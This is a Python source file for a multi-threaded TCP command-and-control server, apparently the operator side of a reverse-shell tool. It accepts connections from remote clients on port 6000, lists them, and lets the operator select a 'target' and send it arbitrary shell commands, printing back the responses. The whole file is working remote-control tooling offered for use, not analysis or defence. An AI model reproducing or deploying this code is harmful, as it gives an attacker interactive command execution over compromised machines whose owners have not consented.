import socket
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
# 1: listen and accept connections when any of the clients connections
# 2: Send commands to clients and handle connection with existing clients
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []
working_index = 0
# create a socket (connect two computers) OK
def create_socket():
  try:
    global host
    global port
    global s
    host = ""
    port = 6000
    s = socket.socket()

  except Exception as msg:
    print("Socket creation error: {}".format(msg))


# Binding the socket and listening for connections
def bind_socket():
  try:
    global host
    global port
    global s
    print("Binding the Port: {}".format(port))
    s.bind((host, port))
    s.listen(5)
  except Exception as msg:
    print("Socket Binding eror {}".format(msg))
    print("Retrying...")
    bind_socket()

# Handling connection from multiple clients and saving to a list
# Closing previous connections when server.py file is restarted
def accepting_connections():
  for c in all_connections:
    c.close()
  del all_connections[:]
  del all_address[:]
  while True:
    try:
      conn, address = s.accept()
      s.setblocking(1)
      all_connections.append(conn)
      all_address.append(address)
      print("Connection has been established: {}".format(address[0]))
    except Exception as err:
      print("Error accepting connections with this err: {}".format(err))

def start_turtle():
  while True:
    cmd = input('suhi> ')
    if cmd == 'list':
      print("listing connections")
      list_connections()
    elif 'select' in cmd:
      conn = select_client(cmd)
      if conn is not None:
        send_target_commands(conn)
    elif 'quit' in cmd or 'exit' in cmd:
      print("Bye")
      queue.task_done()
      queue.task_done()
      exit()
    elif 'help' in cmd:
      print("type 'list' to list all connections")
      print("type 'select + idx' to select the coressponding client")
      print("type 'quit' or 'exit' to shutdown the server")
    else:
      print("Command not recognized")


# Display all current active connections with client

def list_connections():
  if len(all_connections) == 0:
    print("There are no connections")
  for i, conn in enumerate(all_connections):
    try:
      conn.send(str.encode(' '))
      conn.recv(20480)
    except Exception as err:
      print("List connection err: {}".format(err))
      del all_connections[i]
      del all_address[i]
      continue
    print("Connection {} address: {} {}".format(i, all_address[i][0], all_address[i][1]))
  print("Number of connections is: {}".format(len(all_connections)))


# Selecting the target
def select_client(cmd):
  try:
    target = cmd.replace('select ', '')
    working_index = target
    target = int(target)
    conn = all_connections[target]
    print("You are now connected to :{}".format(all_address[target][0]))
    print("{}>".format(all_address[target][0]), end='')
    return conn

  except:
    print("Selection is not valid")
    return

# Send commands to client
def send_target_commands(conn):
  while True:
    try:
      cmd = input()
      if cmd == 'quit' or cmd == 'exit':
        print("Come back to suhi")
        break
      if len(str.encode(cmd)):
        conn.send(str.encode(cmd))
        client_response = str(conn.recv(20480), "utf-8")
        if client_response == 'terminating':
          print("Client was closed")
          conn.close()
          del all_connections[working_index]
          del all_address[working_index]
          break
        print(client_response, end="")
    except:
      print("Error sending commands")
      break




# Do next job that is the queue (handle connections, send commands)
def work():
  while True:
    x = queue.get()
    if x == 1:
      create_socket()
      bind_socket()
      accepting_connections()
      time.sleep(0.5)
    if x == 2:
      time.sleep(0.5)
      print("Start commands screen")
      start_turtle()
    queue.task_done()


def create_jobs():
  for x in JOB_NUMBER:
    queue.put(x)
  queue.join()



# Create worker threads
def create_workers():
  workers = []
  for _ in range(NUMBER_OF_THREADS):
    t = threading.Thread(target=work)
    t.daemon = True
    t.start()

create_workers()
create_jobs()
